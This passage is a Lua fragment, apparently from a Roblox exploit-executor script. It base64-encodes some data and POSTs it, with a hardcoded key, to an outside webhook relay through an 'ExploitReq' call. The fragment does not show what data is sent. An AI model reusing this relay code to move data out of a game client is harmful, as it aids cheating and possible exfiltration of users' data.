            channel = channel,
            bodywbh = base64Data,
            key = "vando", -- Your API key
            proxy = proxyOptions or {
                enabled = false
            }
        }
        
        -- Send request
        local success, response = pcall(function()
            return ExploitReq({
                Url = "https://raw.banana-hub.xyz/api/webhook/send",
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode(requestBody)
            })
        end)
        
        if success then

            return response
        else
            
            return nil
        end
    end

